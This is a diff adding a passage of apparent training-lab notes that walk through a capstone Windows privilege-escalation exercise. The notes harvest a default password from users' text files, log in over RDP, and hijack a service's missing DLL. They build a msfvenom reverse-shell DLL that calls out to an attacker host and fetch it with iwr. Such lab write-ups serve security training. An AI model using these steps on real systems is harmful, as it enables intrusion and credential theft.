@@ -1,0 +1,76 @@
+Questions 2
+Capstone Exercise: Get access to CLIENTWK222 (VM #2) by connecting to the bind shell on port 4444. Use the methods covered in this Module to elevate your privileges to an administrative user. Enter the flag, which is located in C:\Users\enterpriseadmin\Desktop\flag.txt.
+HINT
+1) Connect to port 4444 on your assigned VM #2.
+2) Use the command in Listing 18 to search for text files in the C:\users directory, for any user and password information.
+3) Access RDP using the found credentials. Check for unusual services with write permissions using the command in Listing 40.
+4) Restart the service with your malicious .dll payload for higher privileges (enterpriseuser).
+5) Check your privileges (whoami /priv).
+6) Note that the Spooler service is stopped, so the PrintSpoofer exploit won't work.
+7) If a privilege is Disabled (SeBackupPrivilege) and present, you can still attempt it and try retrieving the flag by copying the Desktop contents of the enterpriseadmin user in this case.
+
+nc 192.168.207.222 4444
+
+PS C:\> whoami /priv
+SeChangeNotifyPrivilege       Bypass traverse checking             Enabled 
+SeUndockPrivilege             Remove computer from docking station Disabled
+SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
+SeTimeZonePrivilege           Change the time zone                 Disabled
+
+Get-ChildItem -Path C:\Users\ -Include *.txt -File -Recurse -ErrorAction SilentlyContinue
+
+# Found a list of txt file in Diana Documents
+PS C:\Users\diana\Documents> type note2.txt
+Default password for new resets will be WelcomeToWinter0121
+PS C:\Users\diana\Documents> cat note20.txt
+cat note20.txt
+Alex's password expired, but he's on holiday for the next 4 weeks. Password reset by IT to the default
+
+PS C:\Users\diana\Documents> net users
+Administrator            
+alex                            
+diana                    
+enterpriseadmin          
+enterpriseuser                            
+offsec                   
+
+# We had validate alex is exist, lets try its password
+xfreerdp /u:Alex /p:WelcomeToWinter0121 /v:192.168.207.222
+
+# Sucessful! Lets open Powershell
+PS C:\Users\alex> whoami /priv
+
+# Unfortunately all the privilege seem normals
+# Follow to the hint, run the command below to check any writeable path for malicious .dll file
+Get-CimInstance -ClassName win32_service | Select Name,State,PathName
+...
+EnterpriseService   Running "C:\Services\EnterpriseService.exe"
+...
+
+# This service looks vulnerable. Lets check its directory
+# There is a EnterpriseServiceLog.txt file
+[00:00:00.000] (bac) WARN   Couldn't load EnterpriseServiceOptional.dll, only using basic features.
+
+# Now we knew that EnterpriseServiceOptional.dll is missing
+# Lets create the payload 
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.223 LPORT=9999 -f dll -o EnterpriseServiceOptional.dll
+
+# Listen to the payload
+msfconsole
+msf6> use multi/handler
+msf6> set payload windows/x64/shell_reverse_tcp 
+msf6> set LHOST tun0
+msf6> set LPORT 9999
+msf6> run
+
+# Upload shell.dll payload
+PS C:\Users\alex> cd C:\Services
+PS C:\Services> iwr -uri http://192.168.45.223/EnterpriseServiceOptional.dll -Outfile EnterpriseServiceOptional.dll
+PS C:\Services> Restart-Service EnterpriseService
+
+
+
+
+
+
+
